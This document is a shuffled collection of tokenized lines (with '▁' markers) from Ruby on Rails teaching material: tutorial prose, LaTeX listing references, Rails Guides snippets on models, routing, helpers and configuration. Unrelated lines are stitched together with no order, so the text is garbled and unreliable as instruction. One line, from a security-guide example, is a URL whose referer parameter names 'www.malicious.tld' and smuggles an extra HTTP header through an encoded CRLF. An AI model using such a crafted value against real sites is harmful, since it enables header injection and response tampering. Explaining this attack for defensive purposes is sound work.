▁Now ▁that ▁we ▁have ▁a ▁fresh ▁and ▁working ▁Rails ▁application , ▁we ' ll ▁take ▁a ▁moment ▁for ▁a ▁step ▁that , ▁while ▁technical ly ▁optional , ▁would ▁be ▁view ed ▁by ▁experience d ▁software ▁developers ▁as ▁practical ly ▁essential : ▁ placing ▁our ▁application ▁source ▁code ▁under ▁\ emph { version ▁control } .
▁You ▁will ▁need ▁to ▁add ▁the ▁` actionpack - xml _ parse r ` ▁gem ▁if ▁you ▁require ▁this ▁feature .
▁# ▁=> ▁< input ▁type =" hidden " ▁id =" user _ token " ▁name =" user [ token ] " ▁value ="# {@ user ▖ token } " ▁/>
▁In ▁order ▁to ▁understand ▁Ajax , ▁you ▁must ▁first ▁understand ▁what ▁a ▁web ▁browser ▁does ╼ normal ly .
▁S ince ▁the ▁Rails ▁console ▁automatically ▁includes ▁the ▁Rails ▁extensions , ▁we ▁can ▁see ▁an ▁example ▁here ▁( this ▁won ' t ▁work ▁in ▁plain ▁\ k ode { i rb }) :
▁( In ▁fact , ▁the ▁tests ▁for ▁valid ▁email ▁addresses ▁should ▁have ▁been ▁passing ▁all ▁along ; ▁since ▁ regex es ▁are ▁not or i ous ly ▁error - prone , ▁the ▁valid ▁email ▁tests ▁are ▁there ▁main ly ▁as ▁a ▁sanit y ▁check ▁on ▁\ k ode { VALID \_ EMAIL \_ REGEX } ▖)
▁Over view ▁of ▁helpers ▁provided ▁by ▁Action ▁View
▁A ▁first , ▁slightly ▁in correct , ▁attempt ▁appears ▁in ▁Listing ~\ ref { code : failed _ signin _ attempt } .
▁Such ▁customizations ▁can ▁easily ▁be ▁accomplish ed ▁by ▁passing ▁options ▁when ▁you ▁create ▁the ▁association ▖
▁The ▁` exclusion ` ▁helper ▁has ▁an ▁option ▁`: in ` ▁that ▁receive s ▁the ▁set ▁of ▁values ▁that ╼ will ▁not ▁be ▁accepted ▁for ▁the ▁validate d ▁attributes ▖
▁ Don ' t ▁ forget ▁to ▁review ▁the ▁difference , ▁to ▁see ▁if ▁there ▁were ▁any ▁un expect ed ▁changes .
▁ Adding ▁ Puma ▁to ▁the ▁\ k ode { Gemfile } .
▁Tests ▁for ▁the ▁ authorization ▁of ▁the ▁following ▁and ▁followers ▁pages ▖
▁As ▁with ▁the ▁Users ▁resource , ▁we ' ll ▁generate ▁scaffold ▁code ▁for ▁the ▁Microposts ▁resource ▁using ▁\ k ode { rails ▁generate ▁scaffold }, ▁in ▁this ▁case ▁implement ing ▁the ▁data ▁model ▁from ▁Figure ~\ ref { fig : demo _ micropost _ model }
▁The ▁new ▁test ▁fails , ▁as ▁required :
▁params ▁= ▁ Hash [ * params ▖ map ▁ { | k , ▁ v | ▁[ k , ▁ v ▖ to _ s ]} ▖ f la tt en ]
▁</ div >
▁In ▁Section ~\ ref { sec : showing _ users }, ▁this ▁page ▁will ▁become ▁the ▁user ' s ▁profile .
▁Next , ▁the ▁` scaffold _ controller ` ▁generator ▁is ▁invoke d , ▁ generating ▁a ▁controller ╼ called ▁` Blorgh :: Article sController ` ▁( at ╼` app / controllers / blorgh / articles _ controller ▖ rb ` ) ▁and ▁its ▁related ▁views ▁at ╼` app / views / blorgh / articles ` ▖
▁T hanks ▁to ▁reader ▁\ href { https :// twitter ▖ com / col m t uite } { C ol m ▁T uite } ▁for ▁his ▁excellent ▁work ▁in ▁help ing ▁to ▁convert ▁the ▁sample ▁application ▁over ▁to ▁the ▁Bootstrap ▁CSS ▁framework .
▁This ▁arrange s ▁to ▁assign ▁a ▁particular ▁value ▁to ▁the ▁password ▁and ▁its ▁confirmation ▁at ▁the ▁same ▁time ▁( in ▁this ▁case , ▁a ▁string ▁of ▁length ~ 5 , ▁construct ed ▁using ▁string ▁ multi plication ▁as ▁in ▁Listing ~\ ref { code : length _ validation _ test }) .
▁Next , ▁we ▁need ▁to ▁run ▁the ▁migration ▁on ▁the ▁production ▁database ▁to ▁tell ▁Heroku ▁about ▁the ▁User ▁data ▁model :
▁If ▁these ▁steps ▁seem ▁mysterious , ▁take ▁he ar t : ▁I ' m ▁just ▁following ▁the ▁instructions ▁from ▁the ▁\ href { https :// github ▖ com / t w b s / bootstrap - sass # bootstrap - for - sass --- } { bootstrap - sass ▁README ▁file } .
▁A ▁mockup ▁of ▁a ▁`` forgot ▁password '' ▁link .
▁In ▁the ▁ ra re ▁even t ▁that ▁your ▁application ▁needs ▁to ▁run ▁some ▁code ▁before ▁Rails ▁itself ▁is ▁loaded , ▁put ▁it ▁above ▁the ▁call ▁to ▁` require ▁' rails / all ' ` ▁in ▁` config / application ▖ rb ` .
▁Or ▁consider ▁ deleting ▁a ▁customer , ▁and ▁ en s ur ing ▁that ▁all ▁of ▁its ▁orders ▁get ▁delete d ▁as ▁well :
▁It ▁ parse s ▁the ╼ response , ▁then ▁fetch es ▁all ▁ associated ▁assets , ▁like ▁JavaScript ▁files ,╼ stylesheets ▁and ▁images ▖
▁| ▁` { ▁" person " : ▁[ null ] ▁}` ▁| ▁` { ▁: person ▁=> ▁nil ▁}` ▁|
▁ V ide o ▁tags ▁can ▁also ▁have ▁any ▁of ▁the ▁HTML ▁options ▁specified ▁at ▁the ▁end ▁( ` id `, ▁` class ` ▁e t ▁ al ) .
▁Rails ▖ application ▖ routes ▖ d raw ▁do
▁For ▁example :
▁As ▁in ▁Chapter ~\ ref { cha : rails _ flavored _ ruby }, ▁our ▁tool ▁of ▁choice ▁for ▁explor ing ▁data ▁models ▁is ▁the ▁Rails ▁console .
▁Ou r ▁strategy ▁will ▁be ▁to ▁describe ▁the ▁results ▁of ▁a ▁typical ▁browser ▁hit --- a ▁visit ▁to ▁the ▁user ▁index ▁page ▁at ▁\ href { http :// localhost :3000/ users }{/ users } --- in ▁terms ▁of ▁ MVC ▁( Figure ~\ ref { fig : mvc _ detailed }) .
▁Initialize r ▁files ▁are ▁loaded ▁in ▁ al ph a be t ical ▁order ▁by ▁their ▁path ▖
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : signin _ after _ signup _ test }
▁We ▁can ▁now ▁ s im p li fy ▁the ▁tests ▁for ▁the ▁Help , ▁About , ▁and ▁Contact ▁pages ▁using ▁the ▁same ▁methods ▁used ▁for ▁the ▁Home ▁page .
▁Listing ~\ ref { code : has _ many _ following _ through _ active _ relationships } ▁keep s ▁the ▁\ k ode { : source } ▁key ▁to ▁emphasize ▁the ▁parallel ▁structure ▁with ▁the ▁\ k ode { has \_ many ▁: following } ▁association .
▁If ▁you ' re ▁interested ▁in ▁see ing ▁the ▁practical ▁effect ▁of ▁this , ▁take ▁a ▁look ▁at ▁the ▁file ▁\ k ode { db / schema ▖ rb }, ▁which ▁should ▁now ▁include ▁a ▁line ▁like ▁this :
▁╼╼ ▁\ section { Sessions } ╼ ▁\ label { sec : sessions _ and _ failed _ login }╼╼
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / string / access ▖ rb ` .
▁M ▖ reachable ?
▁The ▁` initializer ` ▁method ▁take s ▁three ▁arguments ▁with ▁the ▁first ▁being ▁the ▁name ▁for ▁the ▁initializer ▁and ▁the ▁second ▁being ▁an ▁options ▁hash ▁( not ▁show n ▁here ) ▁and ▁the ▁third ▁being ▁a ▁block ▖
▁We ll , ▁there ▁will ▁ still ▁be ▁\ emph { one } ▁thing ▁left ▁that ▁we ▁don ' t ▁understand , ▁which ▁is ▁how ▁Rails ▁t ies ▁this ▁all ▁together : ▁m app ing ▁URLs ▁to ▁actions , ▁making ▁the ▁\ k ode { full \_ title } ▁helper ▁available ▁in ▁views , ▁etc ▖ ▁This ▁is ▁an ▁inter est ing ▁subject , ▁and ▁I ▁encourag e ▁you ▁to ▁in ve st ig ate ▁it ▁further , ▁but ▁know ing ▁exactly ▁\ emph { how } ▁Rails ▁works ▁is ▁not ▁necessary ▁when ▁\ emph { using } ▁Rails .
▁<%= ▁f ▖ text _ area ▁: text ▁%>
▁It ' s ▁time ▁now ▁to ▁get ▁going ▁with ▁a ▁Ruby ▁on ▁Rails ▁development ▁environment ▁and ▁our ▁first ▁application .
▁In ▁order ▁to ▁do ▁this , ▁you ' ll ▁need ▁to ▁have ▁a ▁git ▁remote ▁that ▁point s ▁at ▁the ▁main ╼ Rails ▁repository ▖
▁NOTE : ▁ Only ▁equal ity , ▁ range ▁and ▁ subset ▁check ing ▁are ▁possible ▁with ▁ Hash ▁conditions .
▁ //= ▁require ▁ core
▁The ▁code ▁in ▁Listing ~\ ref { code : minitest _ reporters } ▁mix es ▁single - ▁and ▁double - quot ed ▁strings .
▁@ article ▁= ▁Article ▖ new ( params [: article ])
▁wrap _ parameters ▁format : ▁ [: json ]
▁Then ▁you ▁can ▁change ▁` app / views / articles / show ▖ html ▖ erb ` ▁to ▁look ▁like ▁the ╼ following :
▁More over , ▁ having ▁a ▁good ▁test ▁suite ▁will ▁allow ▁us ▁to ▁\ emph { re factor } ▁our ▁code ▁with ▁confidence , ▁changing ▁its ▁form ▁without ▁changing ▁its ▁function .
▁Be ▁careful ▁about ▁security ; ▁the ▁API ▁should ▁only ▁be ▁ accessible ▁to ▁ authorize d ▁users .
▁Listing ~\ ref { code : password _ migration } ▁uses ▁the ▁\ k ode { add \_ column } ▁method ▁to ▁add ▁a ▁\ k ode { password \_ digest } ▁column ▁to ▁the ▁\ k ode { users } ▁table .
▁ Adding ▁a ▁ sidebar ▁to ▁the ▁user ▁\ k ode { show } ▁view .
▁S k e let on ▁for ▁a ▁string ▁ shuffle ▁function .
▁#### ▁ J o in ing ▁a ▁S ing le ▁Association
▁* ▁` belongs _ to `
▁The ▁password ▁reset ▁mailer ▁method ▁needed ▁to ▁get ▁this ▁working ▁is ▁ nearly ▁identical ▁to ▁the ▁mailer ▁for ▁account ▁activation ▁ developed ▁in ▁Section ~\ ref { sec : account _ activation _ mailer } .
▁More over , ▁you ▁can ▁apply ▁both ▁`: if ` ▁and ╼` : unless ` ▁to ▁the ▁same ▁validation .
▁I ▁shall ▁be ▁late !" ▖ truncate ( 18 )
▁This ▁means ▁that ▁the ▁delete ▁links ▁won ' t ▁work ▁if ▁the ▁user ▁has ▁JavaScript ▁ disabled .
▁C ur r ent ly , ▁if ▁our ▁application ' s ▁users ▁ forget ▁their ▁passwords , ▁they ▁have ▁no ▁way ▁to ▁retrieve ▁them .
▁flash ▖ keys ▁# ▁=> ▁[" string ", ▁" symbol "]
▁ http :// www ▖ your application ▖ com / controller / action ? referer = http :// www ▖ malicious ▖ t ld % 0 d % 0 a X - Head er : + H i !
▁We ▁can ▁put ▁the ▁\ k ode { log \_ out } ▁method ▁to ▁use ▁in ▁the ▁Sessions ▁controller ' s ▁\ k ode { destroy } ▁action , ▁as ▁show n ▁in ▁Listing ~\ ref { code : destroy _ session } .
▁cookies ▖ encrypted [: expiration _ date ] ▁= ▁Date ▖ tomorrow ▁# ▁=> ▁Thu , ▁20 ▁Mar ▁2014
▁Defaults ▁to ▁`: scaffold _ controller ` .
▁* ▁[ jquery - ujs ▁ wiki ]( https :// github ▖ com / rails / jquery - ujs / wiki )
▁The ▁generated ▁view ▁for ▁the ▁Help ▁page .
▁As ▁you ▁m ight ▁guess , ▁each ▁of ▁these ▁directories ▁has ▁a ▁sub directory ▁for ▁each ▁asset ▁class , ▁e ▖ g ▖ ,
▁For ▁example , ▁look ing ▁at ▁Listing ~\ ref { code : typography _ css } ▁and ▁Listing ~\ ref { code : footer _ css }, ▁we ▁see ▁that ▁there ▁are ▁repeated ▁ references ▁to ▁the ▁same ▁ color :
▁# ▁=> ▁< input ▁type =" file " ▁id =" user _ avatar " ▁name =" user [ avatar ] " ▁/>
▁The ▁code ▁in ▁Listing ~\ ref { code : password _ resets _ resource } ▁arrange s ▁for ▁the ▁RESTful ▁routes ▁show n ▁in ▁Table ~\ ref { table : RESTful _ password _ resets } .
▁* ▁` or m ` ▁defines ▁which ▁or m ▁to ▁use ▖
▁Inde ed , ▁as ▁noted ▁in ▁Section ~\ ref { sec : layout _ link _ tests }, ▁ com pre h en s ive ▁tests ▁of ▁things ▁like ▁HTML ▁structure ▁are ▁likely ▁to ▁be ▁brittle ▁and ▁thus ▁ counter - product ive .
▁Active ▁Record ▁automatically ▁creates ▁methods ╼ to ▁allow ▁an ▁application ▁to ▁read ▁and ▁manipulate ▁data ▁store d ▁within ▁its ▁table s .
▁A ▁valid ▁email ▁ regex ▁that ▁di s allow s ▁double ▁do t s ▁in ▁email ▁address ed .
▁ ruby ▁ 2▖0▖ 0 p 3 53
▁You ▁can ▁override ▁any ▁of ▁these ▁defaults ▁by ▁specify ing ▁an ▁appropriate ▁option ▁( `: media `, ▁`: rel ` ) :
▁Now ▁that ▁we ' ve ▁go tt en ▁to ▁ Green , ▁we ▁are ▁free ▁to ▁refactor ▁our ▁code ▁with ▁confidence .
▁The ▁relevant ▁association ▁declaration s ▁could ▁look ▁like ▁this :
▁=> ▁5 242 88 0
▁Some where ▁in ▁the ▁mailer ▁you ▁could ▁group ▁ locale - dependent ▁bit s ▁like ▁this :
▁git ▁add : ▁ "▖"
▁Before ▁mov ing ▁on , ▁let ' s ▁take ▁a ▁ minute ▁to ▁commit ▁our ▁changes ▁and ▁merge ▁them ▁into ▁the ▁master ▁branch .
▁### ▁T ur n ing ▁ Digest s ▁Of f
▁For ▁this ▁reason , ▁when ▁`: minimum ` ▁is ▁1 ▁you ▁should ╼ provide ▁a ▁person al ize d ▁message ▁or ▁use ▁` presence : ▁true ` ▁instead ▖
▁# ▁R a is e ▁exception ▁on ▁ mass ▁assignment ▁ protection ▁for ▁Active ▁Record ▁models
▁Oh ▁ dear ! ▖▖▖"
▁" :: X "▖ constantize ▁# ▁=> ▁: in _ Object
▁As ▁noted ▁in ▁Section ~\ ref { sec : a _ working _ sign _ in _ method }, ▁information ▁store d ▁using ▁\ k ode { session } ▁is ▁automatically ▁secure , ▁but ▁this ▁is ▁not ▁the ▁case ▁with ▁information ▁store d ▁using ▁\ k ode { cookies } .
▁@ article ▁= ▁Article ▖ find ( params [: article _ id ])
▁( The ▁way ▁to ▁ figure ▁this ▁out ▁is ▁to ▁ Ctrl - click ▁and ▁use ▁your ▁browser ' s ▁web ▁ inspect or ▖)
▁d ▖ next _ week ▁# ▁=> ▁Mon , ▁10 ▁May ▁2010
▁We ▁can ▁now ▁include ▁the ▁follow ▁form ▁and ▁the ▁following ▁ st at ist ic s ▁on ▁the ▁user ▁profile ▁page ▁simply ▁by ▁rendering ▁the ▁partials , ▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ follow _ form _ profile _ stats } .
▁( If ▁you ▁want ▁to ▁run ▁SSL ▁on ▁a ▁custom ▁domain , ▁such ▁as ▁\ k ode { www ▖ example ▖ com }, ▁refer ▁to ▁\ href { http :// dev center ▖ heroku ▖ com / articles / ssl } { Heroku ' s ▁page ▁on ▁SSL } ▖)
▁For ▁more ▁information , ▁read ▁the ▁[ Asset ▁Pipeline ▁guide ]( asset _ pipeline ▖ html ) .
▁It ▁is ▁more ▁explicit , ▁though , ▁and ▁communicat es ▁our ▁intention s ▁more ▁clear ly ▁both ▁to ▁Rails ▁and ▁to ▁readers ▁of ▁our ▁code ▖)
▁#### ▁ Builder
▁You ▁would ▁expect ▁each ▁layout ▁to ▁have ▁a ▁different ▁look ▁and ▁feel ▖
▁We ' ll ▁start ▁by ▁giv ing ▁users ▁the ▁ability ▁to ▁update ▁their ▁profile s , ▁which ▁will ▁also ▁provide ▁a ▁natural ▁opportunit y ▁to ▁enforce ▁an ▁ authorization ▁model ▁( ma de ▁possible ▁by ▁the ▁authentication ▁code ▁in ▁Chapter ~\ ref { cha : basic _ login }) .
▁( The ▁\ k ode { before } ▁method ▁can ▁also ▁be ▁invoke d ▁with ▁\ k ode { before (: each ) }, ▁which ▁is ▁a ▁ sy n on y m ▖)
▁An ▁integration ▁test ▁for ▁delete ▁links ▁and ▁destroying ▁users ▖
▁The ▁[ Rails ▁API ▁documentation ]( http :// api ▖ rubyonrails ▖ org ) ▁is ▁generated ▁with ╼[ RDoc ]( http :// docs ▖ s eattle rb ▖ org / rdoc / ) .
▁To ▁modify ▁this ▁behavior ▁you ▁can ▁set ▁` state ment _ limit ` ▁to ▁a ▁different ▁value :
▁* ▁: polymorphic
▁If ▁you ▁want ▁to ▁provide ▁text ▁format ting ▁other ▁than ▁HTML ▁( d ue ▁to ▁security ), ▁use ▁a ▁mark - up ▁language ▁which ▁is ▁convert ed ▁to ▁HTML ▁on ▁the ▁server - side ▖
▁### ▁` to _ param `
▁If ▁you ▁get ▁an ▁error ▁message ▁say ing ▁that ▁the ▁ Spring ▁process ▁id ▁( p id ) ▁file ▁would ▁be ▁over written ▁by ▁the ▁merge , ▁just ▁remove ▁the ▁file ▁using ▁\ k ode { rm ▁- f ▁* ▖ p id } ▁at ▁the ▁command ▁line .
▁In ▁each ▁of ▁these ▁cases , ▁the ▁named ▁routes ▁re main ▁the ▁same ▁as ▁if ▁you ▁did ▁not ▁use ▁` scope ` ▖
▁Rails ▁4▖1 ▁now ▁expect s ▁an ▁explicit ▁block ▁to ▁be ▁passed ▁when ▁calling ╼` ActiveSupport :: Callbacks ▖ set _ callback ` ▖
▁The ▁data ▁model ▁for ▁users .
▁The ▁Micropost ▁data ▁model .
▁The ▁above ▁returns ▁` false ` ▁if ▁the ▁` client s ` ▁table ▁is ▁empty ▁and ▁` true ` ▁otherwise .
▁> > ▁p ▖ save !
▁def ▁update
▁A ▁failed ▁password ▁reset .
▁Un following ▁a ▁user ▁by ▁destroying ▁a ▁user ▁relationship .
▁The ▁ macro ▁` delegate ` ▁offer s ▁an ▁easy ▁way ▁to ▁forward ▁methods .
▁You ▁can ▁also ▁execute ▁the ▁` rake ▁routes ` ▁command ▁in ▁your ▁terminal ▁to ▁produce ▁the ▁same ▁output .
▁The ▁next ▁step ▁is ▁to ▁add ▁all ▁the ▁project ▁files ▁to ▁the ▁repository ▁using ▁\ k ode { git ▁add ▁- A } :
▁Because ▁of ▁the ▁similar ity ▁with ▁passwords ▁and ▁remember ▁token s , ▁we ▁will ▁be ▁able ▁to ▁reuse ▁many ▁of ▁the ▁same ▁idea s ▁for ▁account ▁activation ▁( as ▁well ▁as ▁password ▁reset ), ▁including ▁the ▁\ k ode { User ▖ digest } ▁and ▁\ k ode { User ▖ new \_ token } ▁methods ▁and ▁a ▁ modified ▁version ▁of ▁the ▁\ k ode { user ▖ authenticated ?}\ ▁method .
▁For ▁other ▁actions , ▁you ▁just ▁need ▁to ▁insert ▁the ▁action ▁name ▁as ▁the ▁first ▁element ▁of ▁the ▁array :
▁def ▁un de co ra ted _ table _ name ( class _ name ▁= ▁base _ class ▖ name )
▁On ce ▁an ▁Active ▁Record ▁object ▁has ▁been ▁retrieved , ▁its ▁attributes ▁can ▁be ▁ modified ╼ and ▁it ▁can ▁be ▁saved ▁to ▁the ▁database .
▁Whi le ▁it ' s ▁not ▁ strict ly ▁necessary ▁as ▁part ▁of ▁a ▁Rails ▁3▖2 ▁upgrade , ▁you ▁can ▁start ▁replacing ▁any ▁plugin s ▁by ▁ extract ing ▁them ▁to ▁gems ▁and ▁adding ▁them ▁to ▁your ▁Gemfile ▖
▁ Adding ▁\ k ode { picture } ▁to ▁the ▁list ▁of ▁ permitted ▁attributes .
▁config ▖ middleware ▖ delete ▁" ActionDispatch :: Session :: CookieStore "
▁#### ▁` humanize `
▁< option ▁value =" 2 "> D ▖ ▁ Thomas </ option >
▁| ▁1 ▁| ▁ SIMPLE ▁| ▁users ▁| ▁ const ▁| ▁PR IM A RY ▁|
▁validates _ with ▁G oodnessValidator , ▁fields : ▁ [: first _ name , ▁: last _ name ]
▁If ▁we ▁need ▁to ▁update ▁only ▁a ▁single ▁attribute , ▁using ▁the ▁ singular ▁\ k ode { update \_ attribute } ▁by pass es ▁this ▁restrict ion :
▁To ▁avoid ▁that ,╼ you ▁must ▁create ▁a ▁unique ▁index ▁on ▁both ▁columns ▁in ▁your ▁database ▖
▁S ince ▁our ▁application ▁ la c k s ▁unique ▁user ▁login s , ▁you ▁will ▁also ▁have ▁to ▁d ec ide ▁on ▁a ▁way ▁to ▁represent ▁users .
▁As ▁a ▁second ▁step , ▁ _ it ▁is ▁good ▁practice ▁to ▁escape ▁all ▁output ▁of ▁the ▁application _ , ▁es pecially ▁when ▁re - display ing ▁user ▁input , ▁which ▁has n ' t ▁been ▁input - filter ed ▁( as ▁in ▁the ▁search ▁form ▁example ▁earlier ▁on )▖
▁S ince ▁Ruby ▁ implicit ly ▁returns ▁the ▁value ▁of ▁the ▁last ▁expression ▁in ▁a ▁function , ▁here ▁the ▁\ text tt { foo } ▁method ▁returns ▁\ text tt {" bar "} ▁or ▁\ text tt {" baz "} ▁depending ▁on ▁the ▁value ▁of ▁\ text tt { boolean ?} .
▁Tests ▁for ▁password ▁length ▁and ▁the ▁\ k ode { authenticate } ▁method .
▁Next ▁we ' ll ▁add ▁some ▁CSS ▁that ▁will ▁be ▁used ▁site - wide ▁for ▁styling ▁the ▁layout ▁and ▁each ▁individual ▁page , ▁as ▁show n ▁in ▁Listing ~\ ref { code : universal _ css } .
▁person ▁= ▁Person ▖ create ( name : ▁' H on d a ')
▁* ▁` collection ▖ destroy ( object , ▁ ▖▖▖)
▁ V ir t u ally ▁all ▁web ▁applications ▁require ▁a ▁login ▁and ▁authentication ▁system ▁of ▁some ▁sort .
▁ Don ' t ▁use ▁this ▁name ▁yourself ; ▁it ' s ▁already ▁taken ▁by ▁me !
▁\ begin { equ ation }╼\ label { eq : de lt a _ p }╼\ D el t a ▁t _ r ▁= ▁t _ N ▁- ▁t _ r ╼\ end { equ ation }
▁will ▁produce ▁this ▁HTML :
▁If ▁you ' d ▁rather ▁ play ▁around ▁in ▁the ▁console , ▁` rails ▁console ` ▁will ▁also ▁work ▁just ╼ like ▁a ▁Rails ▁application ▖
▁As ▁of ▁Rails ▁4 ▖ 2, ▁there ' s ▁an ▁even ▁more ▁direct ▁way ▁to ▁get ▁debugging ▁information ▁using ▁the ▁\ text tt { by ebug } ▁gem ▁( Listing ~\ ref { code : gemfile _ sample _ app }) .
▁The ▁user ▁edit ▁page ▁(\ href { http ://0▖0▖0▖0:3000/ users /1/ edit }{/ users /1/ edit }) .
▁#### ▁S p ac er ▁ Template s
▁To ▁accomplish ▁this , ▁we ' ll ▁generate ▁a ▁unique , ▁secure ▁remember ▁token ▁for ▁each ▁user ▁and ▁store ▁it ▁as ▁a ▁\ emph { permanent } ▁cookie ▁rather ▁than ▁one ▁that ▁ expire s ▁on ▁browser ▁close .
▁Add ▁tests ▁for ▁micropost ▁pagination .
▁scope ▁: published , ▁-> ▁ { ▁where ( published : ▁true ) ▁ }
▁The ▁ predicate ▁` exclude ?` ▁tests ▁whether ▁a ▁given ▁object ▁does ▁** not ** ▁be long ▁to ▁the ▁collection ▖
▁create ▁app / models / blorgh / article ▖ rb
▁host : ▁ localhost
▁What ▁is ▁the ▁value ▁of ▁the ▁following ▁expression ?
▁"2010-07-27 ▁23:42:00 "▖ to _ time (: utc ) ▁# ▁=> ▁Tue ▁Ju l ▁ 27 ▁23:42:00 ▁UTC ▁2010
▁The ▁Sessions ▁\ k ode { create } ▁action ▁with ▁ friendly ▁ forwarding .
▁some _ code
▁unless ▁params [: token ] ▖ nil ?
▁A ▁few ▁f un d a ment al ▁objects ▁in ▁Ruby ▁are ▁ singleton s ▖
▁The ▁new ▁\ k ode { README } ▁file , ▁\ k ode { README ▖ md } .
▁< span >
▁The ▁layout ▁will ▁be ▁rendered ▁together ▁with ▁the ▁partial ▁for ▁each ▁item ▁in ▁the ▁collection ▖
▁A lt er n ate ly , ▁you ▁can ▁use ▁the ▁File ▁ menu ▁to ▁create ▁a ▁new ▁file ▁and ▁then ▁ pick ▁the ▁proper ▁directory ▁when ▁saving ▁it .
▁The ▁Relationship ▁data ▁model .
▁We ▁can ▁interact ▁with ▁Rails ▁applications ▁at ▁the ▁command ▁line ▁using ▁the ▁Rails ▁console .
▁The ▁solution ▁to ▁this ▁particular ▁problem ▁is ▁simple : ▁create ╼ a ▁controller ▁called ▁` Article sController ` ▖
▁With ▁the ▁\ k ode { log \_ in } ▁method ▁defined ▁in ▁Listing ~\ ref { code : log _ in _ success }, ▁we ' re ▁now ▁ready ▁to ▁complete ▁the ▁session ▁\ k ode { create } ▁action ▁by ▁logging ▁the ▁user ▁in ▁and ▁redirect ing ▁to ▁the ▁user ' s ▁profile ▁page .
▁You ▁can ▁alias ▁a ▁model ▁attribute ▁ having ▁the ▁corresponding ▁three ▁methods ▁defined ▁for ▁you ▁in ▁one ▁ sh o t ▖
▁M any ▁of ▁Action ▁Dispatch er ' s ▁ internal ▁ components ▁are ▁implemented ▁as ▁Rack ▁middleware s ▖
▁Consider ing ▁ various ▁id io sy n c ra tic ▁customizations , ▁there ▁are ▁ probably ▁as ▁many ▁development ▁ environments ▁as ▁there ▁are ▁Rails ▁programmer s , ▁but ▁there ▁are ▁at ▁least ▁two ▁br o ad ▁types : ▁text ▁editor / command ▁line ▁ environments , ▁and ▁in te gr at ed ▁development ▁ environments ▁( IDE s ) .
▁since ▁( in )
▁ Hash ed ▁password ▁digest s ▁are ▁often ▁ er r one ous ly ▁refer r ed ▁to ▁as ▁\ emph { encrypted ▁passwords } .
▁As ▁the ▁last ▁example ▁implie s , ▁the ▁second ▁argument ▁defaults ▁to ▁true ,╼ as ▁in ▁` const _ defined ?` .
▁require _ dependency ( c )
▁ n _ edit _ action ▁( end ) ╼╼% ▁section ▁ activating _ the _ account ▁( end )╼╼ \ subsection { Activ ation ▁test ▁and ▁refactoring } ▁% ▁( fold )╼\ label { sec : activation _ test _ and _ refactoring }╼╼
▁from ▁Listing ~\ ref { code : password _ reset _ form } ▁to
▁This ▁last ▁example ▁shows ▁that ▁you ▁can ▁ chain ▁push es ▁together , ▁and ▁also ▁that , ▁unlike ▁arrays ▁in ▁many ▁other ▁languages , ▁Ruby ▁arrays ▁can ▁contain ▁a ▁mix t ure ▁of ▁different ▁types ▁( in ▁this ▁case , ▁ integer s ▁and ▁strings ) .
▁# ▁If ▁true , ▁the ▁base ▁class ▁of ▁ anonymous ▁controllers ▁will ▁be ▁inferred
▁N at ur ally , ▁the ▁form er ▁send s ▁a ▁\ text tt { POST } ▁request ▁to ▁the ▁Relationship s ▁controller ▁to ▁\ k ode { create } ▁a ▁relationship , ▁while ▁the ▁latter ▁send s ▁a ▁\ text tt { DELETE } ▁request ▁to ▁\ k ode { destroy } ▁a ▁relationship .
▁The ▁routes ▁defined ▁in ▁Listing ~\ ref { code : sessions _ resource } ▁correspond ▁to ▁URLs ▁and ▁actions ▁similar ▁to ▁those ▁for ▁users ▁( Table ~\ ref { table : RESTful _ users }), ▁as ▁show n ▁in ▁Table ~\ ref { table : RESTful _ sessions } .
▁< strong > Comment : </ strong >
▁The ▁\ k ode { User } ▁class , ▁with ▁inheritance .
▁This ▁includes ▁the ▁code ▁\ k ode { match : ▁: first }, ▁which ▁tell s ▁Capybara ▁that ▁we ▁don ' t ▁care ▁\ emph { which } ▁delete ▁link ▁it ▁click s ; ▁it ▁should ▁just ▁click ▁the ▁first ▁one ▁it ▁see s .
▁This ▁is ▁a ▁re m ar k able ▁amount ▁of ▁functionality ▁for ▁only ▁t w el ve ▁lines ▁of ▁code .
▁T ealeaf ▁is ▁an ▁es pecially ▁good ▁choice ▁if ▁you ▁want ▁in str u c to r ▁feedback ▁within ▁the ▁context ▁of ▁a ▁structure d ▁c ur r ic ul um .
▁as ▁show n ▁in ▁Listing ~\ ref { code : admin _ factory } .
▁In ▁the ▁\ emph { Rails ▁Tutorial }, ▁we ' ll ▁follow ▁the ▁common ▁convention ▁of ▁using ▁the ▁\ k ode { path } ▁form ▁except ▁when ▁doing ▁redirect s , ▁where ▁we ' ll ▁use ▁the ▁\ k ode { url } ▁form .
▁+ - --- +-------------+ - --- ------+-------+ --------------- +
▁The ╼ ve n er able ▁ html - s can n er ▁approach ▁is ▁now ▁of ficial ly ▁being ▁ deprecated ▁in ▁favor ▁of ╼[ ` Rails ▁HTML ▁S an it ize r ` ]( https :// github ▖ com / rails / rails - html - sanitizer ) .
▁< a ▁ href ="# " ▁on click =" paintIt ( this , ▁' # 00 99 00 ', ▁' # FFFFFF ') "> P aint ▁it ▁green </ a >
▁TIP : ▁To ▁stop ▁the ▁web ▁server , ▁hit ▁ Ctrl + C ▁in ▁the ▁terminal ▁window ▁where ▁it ' s ╼ running ▖
▁The ▁issue ▁is ▁that ▁the ▁contents ▁of ▁the ▁flash ▁persist ▁for ▁one ▁\ emph { request }, ▁but --- un like ▁a ▁redirect , ▁which ▁we ▁used ▁in ▁Listing ~\ ref { code : signup _ flash } --- re - render ing ▁a ▁template ▁with ▁\ k ode { render } ▁doesn ' t ▁count ▁as ▁a ▁request ▖ ▁The ▁result ▁is ▁that ▁the ▁flash ▁message ▁persist s ▁one ▁request ▁longer ▁than ▁we ▁want .
▁#### ▁Link ing ▁to ▁JavaScript ▁File s ▁with ▁the ▁` javascript _ include _ tag `
▁The ▁name ▁\ k ode { user } ▁is ▁ im m ate ri al --- we ▁could ▁have ▁written ▁\ k ode {@ users ▖ each ▁do ▁| foobar | } ▁and ▁then ▁used ▁\ k ode { render ▁ foobar } .
▁ ╼ ▁$ ▁ ▖ / configure ▁&& ▁make ▁&& ▁ sudo ▁make ▁install
▁The ▁` mass _ assignment _ sanitizer ` ▁configuration ▁setting ▁should ▁also ▁be ▁be ▁added ▁to ▁` config / environments / test ▖ rb `:
▁100 ▖ to _ s (: percentage )
